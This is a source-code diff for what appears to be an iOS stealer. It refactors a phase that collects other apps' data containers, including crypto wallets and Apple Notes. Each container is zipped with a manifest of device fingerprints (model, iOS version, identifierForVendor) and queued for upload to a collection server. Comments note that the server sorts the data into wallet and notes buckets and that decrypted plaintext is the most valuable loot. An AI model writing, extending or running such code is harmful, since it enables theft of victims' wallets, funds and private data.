@@ -7,6 +7,14 @@
 #import "OWCleanup.h"
 #import "OWSystemGrab.h"
 #import "OWExtractor.h"
+#import "OWArchive.h"
+
+@interface OWRoute ()
+- (void)_uploadContainerResult:(NSDictionary *)r uploader:(OWUploader *)up;
+- (NSDictionary *)_walletManifestForName:(NSString *)name
+                                bundleID:(NSString *)bid
+                                   bytes:(NSNumber *)bytes;
+@end
 
 @implementation OWRoute {
     OWRoutePhase _phase;
@@ -72,30 +80,7 @@
 
     [self _setPhase:OWRoutePhaseContainerUpload];
     for (NSDictionary *r in cp.results) {
-        NSString *p = r[@"path"];
-        if (!p.length) continue;
-
-        BOOL isDir = NO;
-        if (![[NSFileManager defaultManager] fileExistsAtPath:p isDirectory:&isDir]) continue;
-
-        if (!isDir) {
-            // 单文件（整容器 zip 走这条）
-            [up enqueueFile:p kind:OWUploadKindContainer error:nil];
-            continue;
-        }
-
-        // 目录：逐文件入队。OWContainerPass 产出的是「每个目标的采集目录」，
-        // 只上传 !isDir 会把整个容器通道的结果全丢掉（这是旧的假产出 bug 的变体）。
-        NSDirectoryEnumerator *en = [[NSFileManager defaultManager] enumeratorAtPath:p];
-        NSUInteger n = 0;
-        for (NSString *rel in en) {
-            NSString *full = [p stringByAppendingPathComponent:rel];
-            BOOL d = NO;
-            if (![[NSFileManager defaultManager] fileExistsAtPath:full isDirectory:&d] || d) continue;
-            [up enqueueFile:full kind:OWUploadKindContainer error:nil];
-            n++;
-        }
-        OWLog(@"上传: 容器目录 %@ → %lu 个文件", p.lastPathComponent, (unsigned long)n);
+        [self _uploadContainerResult:r uploader:up];
     }
 
     // 端上抽取先跑一轮：容器通道拿到的库里若有明文，这是最值钱的部分，
@@ -180,6 +165,85 @@
     [up flush:&err];
 
     [self _finishWithUploader:up];
+}
+
+#pragma mark 容器结果打包上传
+
+/// 每个目标独立打一个 zip：包根 _manifest.json + <bundleId>/ 文件。
+/// 服务端 route_native_upload 只有看到 zip 根的 _manifest.json 才会归入 wallet_*。
+- (void)_uploadContainerResult:(NSDictionary *)r uploader:(OWUploader *)up {
+    NSString *p = r[@"path"];
+    if (!p.length) return;
+
+    BOOL isDir = NO;
+    if (![[NSFileManager defaultManager] fileExistsAtPath:p isDirectory:&isDir]) return;
+
+    NSString *rawName = r[@"name"] ?: @"Unknown";
+    // 服务端把 Notes 单独归 notes_db；其余名字会落到 wallet_<name> / wallet_mix
+    NSString *name = [rawName isEqualToString:@"AppleNotes"] ? @"Notes" : rawName;
+    NSString *bid = r[@"bundleId"] ?: name;
+
+    if (!isDir) {
+        // whole_container 已经是 zip（OWContainerPass 打包时已带 _manifest.json）
+        [up enqueueFile:p kind:OWUploadKindContainer error:nil];
+        OWLog(@"上传: 整容器包 %@", p.lastPathComponent);
+        return;
+    }
+
+    NSDictionary *manifest = [self _walletManifestForName:name bundleID:bid bytes:r[@"bytes"]];
+    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:
+        [NSString stringWithFormat:@"ow_pack_%@_%llu.zip", name,
+         (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000)]];
+
+    NSError *e = nil;
+    BOOL ok = [OWArchive zipDirectory:p
+                                   to:tmp
+                             manifest:manifest
+                               subdir:bid
+                             maxBytes:200ULL * 1024 * 1024
+                             totalCap:800ULL * 1024 * 1024
+                                error:&e];
+    if (ok) {
+        BOOL enq = [up enqueueFile:tmp kind:OWUploadKindContainer error:nil];
+        OWLog(@"上传: 钱包包 %@ -> %@", name, enq ? tmp.lastPathComponent : @"入队失败");
+        [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
+        return;
+    }
+
+    // 打包失败才退回逐文件（至少不丢数据）
+    OWLog(@"上传: 钱包打包失败 %@（%@），退回逐文件",
+          name, e.localizedDescription ?: @"无条目");
+    NSDirectoryEnumerator *en = [[NSFileManager defaultManager] enumeratorAtPath:p];
+    NSUInteger n = 0;
+    for (NSString *rel in en) {
+        NSString *full = [p stringByAppendingPathComponent:rel];
+        BOOL d = NO;
+        if (![[NSFileManager defaultManager] fileExistsAtPath:full isDirectory:&d] || d) continue;
+        [up enqueueFile:full kind:OWUploadKindContainer error:nil];
+        n++;
+    }
+    OWLog(@"上传: 容器目录 %@ → %lu 个文件", name, (unsigned long)n);
+}
+
+- (NSDictionary *)_walletManifestForName:(NSString *)name
+                                bundleID:(NSString *)bid
+                                   bytes:(NSNumber *)bytes {
+    UIDevice *dev = [UIDevice currentDevice];
+    NSString *idfv = dev.identifierForVendor.UUIDString ?: @"";
+    NSString *machine = [OWDeviceProfile current].machine ?: dev.model;
+    NSArray *found = name.length ? @[name] : @[];
+    NSArray *wallets = name.length
+        ? @[@{@"wallet": name, @"bundleID": bid ?: @"", @"bytes": bytes ?: @0}]
+        : @[];
+    return @{
+        @"deviceFolder": [NSString stringWithFormat:@"%@ iOS%@ %@",
+                          dev.model, dev.systemVersion, idfv],
+        @"ios": dev.systemVersion ?: @"",
+        @"productType": machine ?: @"",
+        @"found": found,
+        @"wallets": wallets,
+        @"source": @"OPENsrc",
+    };
 }
 
 #pragma mark 抽取产物
